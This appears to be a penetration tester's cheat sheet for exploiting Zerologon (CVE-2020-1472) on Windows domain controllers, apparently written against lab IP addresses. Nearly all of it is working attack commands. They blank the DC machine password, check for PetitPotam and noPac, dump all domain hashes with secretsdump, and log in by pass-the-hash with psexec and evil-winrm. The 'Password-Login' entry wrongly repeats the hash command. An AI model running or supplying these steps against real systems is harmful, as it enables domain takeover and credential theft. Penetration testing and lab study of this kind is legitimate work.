If you think it's vulnerable, do this scan to get NetBIOS_Computer_Name and DNS name
nmap -T5 10.11.1.120 -A -v

Be mindful this attack could be harmful to the environment on real asssessments. Don't do unless sure it's safe.

If it's vulnerable to Zerologon, use this empty the password to target machine(Domain Controller if you can):
python3 set_empty_pw.py ZERO-DC 172.31.1.29
netexec smb $target -u '' -p '' -M zerologon

Check for petitpotam & nopac too:
netexec smb $target -u '' -p '' -M petitpotam
netexec smb $target -u $username -p $pass -M nopac

Once successful, use this to dump all hashes:
secretsdump.py 'Zero.csl0/ZERO-DC$@172.31.1.29'

If once again successful, you have all hashes. You can crack these offline, or use psexec or evil-winrm to access machines

Hash-login with psexec:
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:36242e2cb0b26d16fafd267f39ccf990 Administrator@172.31.1.29

Hash-login with evil-winrm:
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.186.150

Password-Login with evil-winrm:
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.186.150

---

This scripts works well too:
<https://github.com/dirkjanm/CVE-2020-1472>

Syntax of exploit:
python3 cve-2020-1472-exploit.py ‘SV-DC01$’ 10.11.1.20

Once successful, use this to dump all hashes:
impacket-secretsdump -just-dc-ntlm -no-pass 'svcorp/SV-DC01$@10.11.1.20'

impacket-secretsdump 'xor.com/XOR-DC01$@10.11.1.120' -just-dc-ntlm -no-pass